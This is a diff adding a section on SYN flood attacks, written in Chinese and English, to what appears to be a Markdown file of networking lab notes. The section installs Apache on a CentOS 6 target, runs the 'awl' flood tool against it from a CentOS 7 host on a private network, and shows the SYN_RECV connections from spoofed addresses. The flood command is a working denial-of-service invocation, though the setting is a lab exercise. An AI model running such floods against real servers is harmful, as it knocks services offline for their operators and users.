@@ -403,3 +403,38 @@ listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes
 ```
 - seq 2296476984 -> ack 2296476985
 - seq 2783925694 -> ack 2783925695
+
+
+
+# 洪水攻击
+1. centos6
+```
+yum -y install httpd
+service httpd status
+service httpd restart
+```
+2. centos7
+```
+[root@localhost ~]# awl -i ens33 -m 00:0c:29:08:86:b8 -d 192.168.0.11 -p 80
+^Cpool_renew success
+pthread join 0 is success !
+pthread join 1 is success !
+pthread join 2 is success !
+pthread join 3 is success !
+pthread join 4 is success !
+pthread join 5 is success !
+pthread join 6 is success !
+pthread join 7 is success !
+```
+3. go back to cenos6
+```
+netstat -anutp | grep 80
+
+tcp        0      0 192.168.0.11:80             162.180.33.66:30350         SYN_RECV    -                   
+tcp        0      0 192.168.0.11:80             55.224.253.41:42381         SYN_RECV    -                   
+tcp        0      0 192.168.0.11:80             1.44.16.75:33147            SYN_RECV    -                   
+tcp        0      0 192.168.0.11:80             68.126.169.58:49177         SYN_RECV    -                   
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      2800/master         
+tcp        0      0 :::80                       :::*                        LISTEN      3811/httpd          
+
+```
